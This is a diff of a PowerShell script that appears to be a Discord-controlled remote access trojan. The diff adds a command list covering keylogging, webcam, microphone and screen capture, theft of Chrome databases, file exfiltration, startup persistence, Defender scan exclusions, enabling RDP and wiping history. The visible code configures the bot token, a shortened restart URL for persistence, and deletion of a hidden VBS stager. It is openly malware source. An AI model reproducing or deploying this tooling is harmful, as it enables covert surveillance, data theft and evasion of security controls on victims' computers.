@@ -1,5 +1,100 @@
 
-# ================================================================ Discord C2 ======================================================================
+# =====================================================================================================================================================
+<#
+    SpeechToText: Send audio transcript to Discord
+
+    QuickInfo: Send a quick System info embed (sent on first connect)
+
+    Systeminfo: Send System info as text file to Discord
+
+    FolderTree: Save folder trees to file and send to Discord
+
+    EnumerateLAN: Show devices on LAN (see ExtraInfo)
+
+    NearbyWifi: Show nearby wifi networks (!user popup!)
+
+    ChromeDB: Gather Database files from Chrome and send to Discord (view them in DBBrowser.exe)
+
+    AddPersistance: Add this script to startup.
+
+    RemovePersistance: Remove Poshcord from startup
+
+    IsAdmin: Check if the session is admin
+
+    Elevate: Attempt to restart script as admin (!user popup!)
+
+    ExcludeCDrive: Exclude C:/ Drive from all Defender Scans
+
+    ExcludeAllDrives: Exclude C:/ - G:/ Drives from Defender Scans
+
+    EnableRDP: Enable Remote Desktop on target.
+
+    EnableIO: Enable Keyboard and Mouse
+
+    DisableIO: Disable Keyboard and Mouse
+
+    RecordAudio: Record microphone and send to Discord
+
+    RecordScreen: Record Screen and send to Discord
+
+    TakePicture: Send a webcam picture and send to Discord
+
+    Exfiltrate: Send various files. (see ExtraInfo)
+
+    Upload: Upload a file from connected machine. (see ExtraInfo)
+
+    Download: Download a file to the current directory on the client. (attach a file with the command)
+
+    Screenshot: Sends a screenshot of the desktop and send to Discord
+
+    Keycapture: Capture Keystrokes and send to Discord
+
+    FakeUpdate: Spoof Windows-10 update screen using Chrome
+
+    Windows93: Start parody Windows93 using Chrome
+
+    WindowsIdiot: Start fake Windows95 using Chrome
+
+    SendHydra: Never ending popups (use killswitch) to stop
+
+    SoundSpam: Play all Windows default sounds on the target
+
+    Message: Send a message window to the User (!user popup!)
+
+    VoiceMessage: Send a message window to the User (!user popup!)
+
+    MinimizeAll: Send a voice message to the User
+
+    EnableDarkMode: Enable System wide Dark Mode
+
+    DisableDarkMode: Disable System wide Dark Mode\
+
+    VolumeMax: Maximise System Volume
+
+    VolumeMin: Minimise System Volume
+
+    ShortcutBomb: Create 50 shortcuts on the desktop.
+
+    Wallpaper: Set the wallpaper (wallpaper -url http://img.com/f4wc)
+
+    Goose: Spawn an annoying goose (Sam Pearson App)
+
+    ExtraInfo: Get a list of further info and command examples
+
+    Cleanup: Wipe history (run prompt, powershell, recycle bin, Temp)
+
+    Kill: Stop a running module (eg. Keycapture / Exfiltrate)
+
+    ControlAll: Control all waiting sessions simultaneously
+
+    ShowAll: Control all waiting sessions simultaneously
+
+    Pause: Pause the current authenticated session
+
+    Close: Close this session
+
+#>
+# =====================================================================================================================================================
 
 $token = "$tk" # make sure your bot is in the same server as the webhook
 $chan = "$ch" # make sure the bot AND webhook can access this channel
@@ -11,17 +106,17 @@ $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
 $parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
 
-$version = "1.5.1" # Check version number
-$response = $null
-$previouscmd = $null
-$authenticated = 0
-$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
-
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
     $InfoOnConnect = 0
     rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
+
+$version = "1.5.1" # Check version number
+$response = $null
+$previouscmd = $null
+$authenticated = 0
+$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 
 # =============================================================== MODULE FUNCTIONS =========================================================================
 
